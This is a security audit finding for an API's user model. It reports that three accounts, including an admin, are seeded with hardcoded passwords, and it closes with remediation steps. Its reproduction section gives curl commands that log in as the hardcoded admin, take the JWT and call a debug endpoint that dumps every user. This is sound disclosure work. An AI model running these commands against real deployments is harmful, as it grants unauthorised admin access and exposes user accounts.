# M1 PoC — Hardcoded Database Credentials (Default Users)

**Severity**: Medium  
**PoC-Status**: theoretical  
**Affected file**: `models/user_model.py:99-101`

## Vulnerability

`init_db_users()` seeds three accounts with hardcoded credentials on every fresh
database initialisation. The admin account carries elevated privileges.

```python
User.register_user("name1", "pass1", "mail1@mail.com", False)
User.register_user("name2", "pass2", "mail2@mail.com", False)
User.register_user("admin", "pass1", "admin@mail.com", True)
```

## Attack Scenario

An attacker with network access to the API endpoint needs no prior knowledge:
the credentials are publicly visible in the repository. Authenticating as
`admin` yields a JWT that authorises admin-only operations.

## Reproduction — curl commands

```bash
TARGET="http://localhost:5000"

# Step 1 — authenticate as hardcoded admin
TOKEN=$(curl -s -X POST "$TARGET/users/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"pass1"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['auth_token'])")

echo "JWT: $TOKEN"

# Step 2 — use the token to access the privileged debug endpoint (lists all users)
curl -s -X GET "$TARGET/users/v1/_debug" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

### Expected output (Step 1)

```json
{
  "auth_token": "<jwt>",
  "message": "Successfully logged in.",
  "status": "success"
}
```

### Expected output (Step 2 — full user dump, admin-only)

```json
[
  {"admin": true,  "email": "admin@mail.com", "username": "admin"},
  {"admin": false, "email": "mail1@mail.com", "username": "name1"},
  {"admin": false, "email": "mail2@mail.com", "username": "name2"}
]
```

## Impact

- Admin account access with no brute-force required — credentials are
  committed to source.
- Any deployment that does not rotate these seeds is permanently compromised.
- Non-admin accounts (`name1`/`pass1`, `name2`/`pass2`) are equally exposed.

## Remediation

1. Remove `init_db_users()` from the codebase (or gate it behind
   `app.config["TESTING"]`).
2. Seed initial users from environment variables or a secrets manager.
3. Enforce a minimum password-complexity policy at registration time.
